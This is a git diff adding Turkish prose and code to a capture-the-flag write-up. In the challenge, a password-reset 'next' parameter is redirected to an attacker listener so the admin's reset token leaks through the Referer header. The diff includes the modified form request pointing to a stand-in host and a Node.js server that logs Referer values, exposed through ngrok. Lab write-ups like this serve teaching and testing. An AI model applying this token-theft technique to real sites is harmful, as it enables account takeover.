@@ -29,6 +29,13 @@ BayrakBende{b4ll3r1n4_c4ppuc1n0}
 
 # WriteUp
 
+## Sorunun Anlaşılması ve Giriş
+
+Soru ile ilgili bilgilerimiz:
+
+- Bu web güvenliği sorusunda, bize urbatek kurumunun personeli tarafından kullanılan çok amaçlı bir platforma erişim verilmektedir.
+- Duyuru olarak da gönderildiği üzere, kurumun yöneticileri kendilerine mail yoluyla gelecek herhangi bir bağlantıya düşünmeden tıklayacak kadar bilinçsizlerdir. 
+
 ## Web Sitesinin Araştırılması
 
 Soru sitesine girdiğimizde, bizi birbirinden farklı iki platforma yönlendirmeyi sağlayan 2 platform karşılamaktadır.
@@ -58,5 +65,71 @@ http://soru.bayraksende.com:2999/login
 ------WebKitFormBoundarym7tRlaLaR4ztC8jN--
 ```
 
-Ve gelen bağlantıya tıkladığımızda, tam da istek gövdesindeki bağlantıya yönlendirildiğimizi fark etmemiz gerekmektedir.
+
+Yukarıdaki istekte kullanıcı adımızı içeren 'username', ve yönlendirileceğimiz bağlantıyı içeren 'next' olmak üzere 2 tane parametre bulunmaktadır. 
+
+
+
+Ve gelen bağlantıdan şifre sıfırlama talebini başarıyla oluşturduğumuzda, 3 saniye sonra tam da istek gövdesindeki 'next' alanındaki bağlantıya yönlendirildiğimizi fark etmemiz gerekmektedir.
+
+
+
+Yani kendimize gönderdiğimiz şifre sıfırlama isteğindeki 'next' alanını değiştirerek kendi e-postamıza gelen sıfırlama bağlantısını modifiye edebiliriz.
+
+
+Örneğin, isteğimizi aşağıdaki gibi düzenlersek:
+
+
+```formdata
+------WebKitFormBoundarym7tRlaLaR4ztC8jN
+Content-Disposition: form-data; name="username"
+
+kullanici_adi
+------WebKitFormBoundarym7tRlaLaR4ztC8jN
+Content-Disposition: form-data; name="next"
+
+http://xxxx.listener/
+------WebKitFormBoundarym7tRlaLaR4ztC8jN--
+```
+
+Verilen adrese yönlendirilecek bir bağlantı gönderilmiş olacak.
+
+
+Soru metni ve duyurulardaki bilgileri hatırlarsak, platform yöneticilerinin kendi e-posta kutularına gelen herhangi bir bağlantıya tıklayacak kadar bilinçsiz oldukları belirtilmişti.
+Peki, bu düzenlenen payload'da kullanıcı adını yöneticilerin kullanıcı adıyla değiştirir ve url kısmını kendi sunucumuza yönlendirecek şekilde değiştirirsek ne olur?
+
+
+Şifre sıfırlama bağlantılarının formatını inceleyelim:
+
+`http://soru.bayraksende.com:2999/reset-password?token=ca208519-0339-4ce4-89a3-cbdc21c7f3c5&next=http://soru.bayraksende.com:2999/login`
+
+
+Bağlantı, post istek gövdemizde verdiğimiz 'next' alanını ve sunucu tarafında oluşturulması muhtemel olan bir şifre sıfırlama tokenını içeriyor.
+Bu da şu anlama geliyor: Yöneticiyi kendi web sitemize yönlendirip, onun isteğinden gelen 'referer' başlığını alırsak buradan önce bulunduğu tam url'yi görürüz, ki bu da şifre sıfırlama tokenını içerdiği için admin kullanıcısı için şifre sıfırlama talebi açabilmemiz anlamına gelmektedir.
+
+
+# Listener Sunucu Kurulumu ve Zafiyetin Sömürülmesi 
+
+Öncelikle, admin kullanıcısının 'referer' başlığını almamız ve depolamamız için bir sunucuya ihtiyacımız olacak. Bunun için istersek dışarıya açık bir sunucumuz ya da hosting'imiz varsa onu, yoksa da kendi cihazımızı ngrok veya serveo gibi reverse proxyler aracılığıyla dışarı çıkararak kendi cihazımızı kullanabiliriz. Pipedream veya webhook gibi sistemlerle de yapmak mümkün, ben çözümde herkes için uygun olması sebebiyle kendi cihaızımı ngrok ile dışarı çıkararak kullanacağım.
+
+
+Bunun için en kolay yol, kullanmayı en sevdiğimiz yazılım kütüphanesi ve diliyle bir web sunucusu yazmak, ve gelen isteklerdeki referer http başlığının değerini konsola yazdırmak. Ben rahat olduğum ve severek yazdığım için Node.js kullanacağım, siz ne isterseniz onu kullanabilirsiniz.
+
+```js
+const http = require('http');
+
+const server = http.createServer((req, res) => {
+    const now = new Date();
+    const ip = req.socket.remoteAddress;
+    const referer = req.headers.referer || 'none';
+    console.log(`${now.toISOString()} - IP: ${ip}, Referer: ${referer}`);
+    res.end();
+});
+
+server.listen(3000);
+```
+
+Kodu çalıştırdığımda, sunucum cihazın 3000 portunda hazır bekliyor olacak. Bu portu ngrok reverse proxy kullanarak dışarı çıkaracağım, ki tüm kullanıcılar dolayısıyla da adminimiz erişebilsin.
+
+
 
